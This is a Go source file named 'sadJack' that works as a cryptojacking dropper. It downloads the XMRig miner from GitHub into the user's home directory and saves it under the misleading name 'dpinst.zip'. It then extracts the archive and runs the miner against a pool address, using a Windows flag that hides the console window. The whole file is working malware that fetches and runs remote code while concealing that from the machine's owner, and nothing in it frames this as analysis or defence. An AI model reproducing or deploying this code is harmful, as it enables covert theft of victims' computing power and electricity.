package main

import (
	"archive/zip"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
)

type Info struct {
	url        string
	file       *os.File
	destFolder string
	path       string
	minerName  string
}

func main() {
	mine := Info{}
	mine.set()
	mine.downloader()
	mine.extractor()
	fmt.Println("sadJack running...")
	mine.starter()
}

func (f *Info) set() {
	f.url = "https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-msvc-win64.zip"
	f.destFolder = "sadJack"

	//fmt.Println("properties set done")

}

func (f *Info) downloader() {
	path, err := os.UserHomeDir()
	f.path = path
	if err != nil {
		fmt.Println(err)
	}

	err = os.Chdir(path)
	if err != nil {
		fmt.Println(err)
	}

	r, err := http.Get(f.url)
	if err != nil {
		os.Exit(3)
	}

	file, err := os.Create("dpinst.zip")
	if err != nil {
		os.Exit(4)
	}

	defer file.Close()

	_, err = io.Copy(file, r.Body)
	if err != nil {
		fmt.Println(err)
	}

	f.file = file

	//fmt.Println("downloader done")

}

func (f *Info) extractor() {

	filenames := []string{}

	unzip, err := zip.OpenReader(f.file.Name())
	if err != nil {
		fmt.Println(err)
	}

	defer unzip.Close()

	for _, file := range unzip.File {
		filePath := filepath.Join(f.destFolder, file.Name)

		filenames = append(filenames, filePath)

		if file.FileInfo().IsDir() {
			f.minerName = file.FileInfo().Name()
			os.MkdirAll(filePath, os.ModePerm)
			continue
		}

		if err = os.MkdirAll(filepath.Dir(filePath), os.ModePerm); err != nil {
			fmt.Println(err)
		} else {

			destFile, err := os.OpenFile(filePath, os.O_RDWR|os.O_CREATE, file.Mode())
			if err != nil {
				fmt.Println(err)
			}

			fileInArchive, err := file.Open()
			if err != nil {
				fmt.Println(err)
			}

			_, err = io.Copy(destFile, fileInArchive)

			if err != nil {
				fmt.Println(err)
			}

			destFile.Close()
			fileInArchive.Close()

			//fmt.Println("Extracting...")
		}

	}

	//fmt.Println("done extracting")

}

/*
func (f *Info) Bashfile() {
	bstring := `
	`
}
*/

func (f *Info) starter() {
	path := "/"
	dest := f.destFolder
	mname := f.minerName
	err := os.Chdir(f.path + path + dest + path + mname + path)
	if err != nil {
		fmt.Println(err)
	}

	dr, _ := os.Getwd()

	cmdInstance := exec.Command("cmd", "/c", dr+path+"xmrig.exe", "--url", "pool.example.sadjack:80", "--user", "wallet address", "--pass", "password")
	if err != nil {
		fmt.Println(err)
	}

	cmdInstance.SysProcAttr = &syscall.SysProcAttr{CreationFlags: 0x08000000}
	_, err = cmdInstance.Output()
	if err != nil {
		fmt.Println(err)
	}

}
